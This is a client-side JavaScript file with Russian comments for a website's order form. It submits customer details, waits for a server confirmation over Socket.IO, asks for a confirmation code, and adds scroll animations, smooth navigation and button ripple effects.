// Инициализация Socket.IO
const socket = io();

// Модальные окна
const orderModal = document.getElementById('orderModal');
const loadingModal = document.getElementById('loadingModal');
const codeModal = document.getElementById('codeModal');
const thanksModal = document.getElementById('thanksModal');

// Кнопки и формы
const orderBtn = document.getElementById('orderBtn');
const orderForm = document.getElementById('orderForm');
const codeForm = document.getElementById('codeForm');
const closeBtn = document.querySelector('.close');

let currentOrderId = null;

// Открытие модального окна заказа
orderBtn.addEventListener('click', () => {
    orderModal.style.display = 'block';
});

// Закрытие модального окна
closeBtn.addEventListener('click', () => {
    orderModal.style.display = 'none';
});

// Закрытие при клике вне окна
window.addEventListener('click', (e) => {
    if (e.target === orderModal) {
        orderModal.style.display = 'none';
    }
});

// Отправка заказа
orderForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const formData = new FormData(orderForm);
    const orderData = {
        customerName: formData.get('customerName'),
        customerPhone: formData.get('customerPhone'),
        customerEmail: formData.get('customerEmail'),
        orderDetails: formData.get('orderDetails')
    };

    try {
        const response = await fetch('/api/order', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(orderData)
        });

        const result = await response.json();
        
        if (result.success) {
            currentOrderId = result.orderId;
            orderModal.style.display = 'none';
            loadingModal.style.display = 'block';
        } else {
            alert('Ошибка при отправке заказа. Попробуйте еще раз.');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Ошибка при отправке заказа. Попробуйте еще раз.');
    }
});

// Отправка кода подтверждения
codeForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const formData = new FormData(codeForm);
    const code = formData.get('confirmationCode');

    try {
        const response = await fetch('/api/verify-code', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ 
                orderId: currentOrderId, 
                code: code 
            })
        });

        const result = await response.json();
        
        if (result.success) {
            codeModal.style.display = 'none';
            thanksModal.style.display = 'block';
        } else {
            alert('Неверный код подтверждения. Попробуйте еще раз.');
        }
    } catch (error) {
        console.error('Error:', error);
        alert('Ошибка при проверке кода. Попробуйте еще раз.');
    }
});

// Обработка событий от сервера через WebSocket
socket.on('orderConfirmed', (data) => {
    if (data.orderId === currentOrderId) {
        loadingModal.style.display = 'none';
        codeModal.style.display = 'block';
    }
});

socket.on('orderRejected', (data) => {
    if (data.orderId === currentOrderId) {
        loadingModal.style.display = 'none';
        alert('Ваш заказ был отклонен. Пожалуйста, свяжитесь с нами для уточнения деталей.');
    }
});

// Анимация загрузки
function showLoadingModal() {
    loadingModal.style.display = 'block';
}

function hideLoadingModal() {
    loadingModal.style.display = 'none';
}

// Уведомление о подключении
socket.on('connect', () => {
    console.log('Connected to server');
});

socket.on('disconnect', () => {
    console.log('Disconnected from server');
});

// ========== Анимации при прокрутке ==========

// Функция для проверки видимости элемента
function isElementInViewport(el) {
    const rect = el.getBoundingClientRect();
    const windowHeight = window.innerHeight || document.documentElement.clientHeight;
    
    return (
        rect.top <= windowHeight * 0.85 &&
        rect.bottom >= 0 &&
        rect.left >= 0 &&
        rect.right <= (window.innerWidth || document.documentElement.clientWidth)
    );
}

// Функция для анимации элементов при появлении в зоне видимости
function animateOnScroll() {
    const elements = document.querySelectorAll('.scroll-animate');
    
    elements.forEach(element => {
        if (isElementInViewport(element)) {
            element.classList.add('animate');
        }
    });
}

// Инициализация анимаций при загрузке страницы
function initScrollAnimations() {
    // Сначала проверяем элементы, которые уже в зоне видимости
    animateOnScroll();
    
    // Добавляем обработчик события прокрутки с throttling
    let ticking = false;
    
    function scrollHandler() {
        if (!ticking) {
            requestAnimationFrame(() => {
                animateOnScroll();
                ticking = false;
            });
            ticking = true;
        }
    }
    
    window.addEventListener('scroll', scrollHandler, { passive: true });
    window.addEventListener('resize', animateOnScroll, { passive: true });
}

// Инициализация навигации
function initNavigation() {
    const navbar = document.querySelector('.navbar');
    const navLinks = document.querySelectorAll('.nav-link');
    
    // Добавление класса при прокрутке
    window.addEventListener('scroll', () => {
        if (window.scrollY > 50) {
            navbar.classList.add('scrolled');
        } else {
            navbar.classList.remove('scrolled');
        }
    }, { passive: true });
    
    // Плавная прокрутка для навигационных ссылок
    navLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            const href = link.getAttribute('href');
            if (href && href.startsWith('#')) {
                e.preventDefault();
                const targetId = href.substring(1);
                const targetElement = document.getElementById(targetId);
                
                if (targetElement) {
                    const offsetTop = targetElement.offsetTop - 80; // Учитываем высоту навбара
                    
                    window.scrollTo({
                        top: offsetTop,
                        behavior: 'smooth'
                    });
                    
                    // Обновляем активный класс
                    navLinks.forEach(l => l.classList.remove('active'));
                    link.classList.add('active');
                }
            }
        });
    });
}

// Функция для добавления микро-взаимодействий
function initMicroInteractions() {
    // Анимация кнопок при клике
    const buttons = document.querySelectorAll('button, .btn');
    
    buttons.forEach(button => {
        button.addEventListener('click', function(e) {
            // Создаем эффект ripple
            const ripple = document.createElement('span');
            const rect = this.getBoundingClientRect();
            const size = Math.max(rect.width, rect.height);
            const x = e.clientX - rect.left - size / 2;
            const y = e.clientY - rect.top - size / 2;
            
            ripple.style.width = ripple.style.height = size + 'px';
            ripple.style.left = x + 'px';
            ripple.style.top = y + 'px';
            ripple.classList.add('ripple-effect');
            
            this.appendChild(ripple);
            
            // Удаляем эффект через 600ms
            setTimeout(() => {
                if (ripple.parentNode) {
                    ripple.parentNode.removeChild(ripple);
                }
            }, 600);
        });
    });
}

// Инициализация всех функций при загрузке DOM
document.addEventListener('DOMContentLoaded', () => {
    initScrollAnimations();
    initNavigation();
    initMicroInteractions();
    
    console.log('🎨 Анимации и взаимодействия инициализированы');
});
